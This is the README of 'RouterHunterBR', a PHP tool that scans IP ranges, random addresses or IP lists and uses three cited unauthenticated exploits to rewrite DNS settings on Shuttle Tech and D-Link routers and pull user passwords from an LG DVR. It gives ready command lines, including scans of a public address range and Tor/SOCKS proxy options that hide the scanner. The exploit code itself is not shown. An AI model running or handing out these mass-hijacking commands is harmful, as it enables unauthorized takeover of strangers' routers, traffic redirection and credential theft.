# RouterHunterBR
TOOL - Unauthenticated Remote DNS , Scanner ranger IP.

* Description:*
  The script explores two vulnerabilities in routers
  01 - Shuttle Tech ADSL Modem-Router 915 WM / Unauthenticated Remote DNS Change Exploit
  reference: http://www.exploit-db.com/exploits/35995/

  02 - D-Link DSL-2740R / Unauthenticated Remote DNS Change Exploit
  reference: http://www.exploit-db.com/exploits/35917/

  03 - LG DVR LE6016D / Unauthenticated users/passwords disclosure exploitit
  reference: http://www.exploit-db.com/exploits/36014/

  ----------------------------------------------------------

 * Execute*
  Simple search:   php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  Set IPS random:  php RouterHunterBR.php --rand --limit-ip 200 --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  Set source file: php RouterHunterBR.php --file ips.txt --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  Set proxy:       php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt --proxy 'localhost:8118'
  Proxy format:
  --proxy 'localhost:8118'
  --proxy 'socks5://googleinurl@localhost:9050'
  --proxy 'http://admin:12334@172.16.0.90:8080'
  ----------------------------------------------------------

 * Dependencies*
  sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033
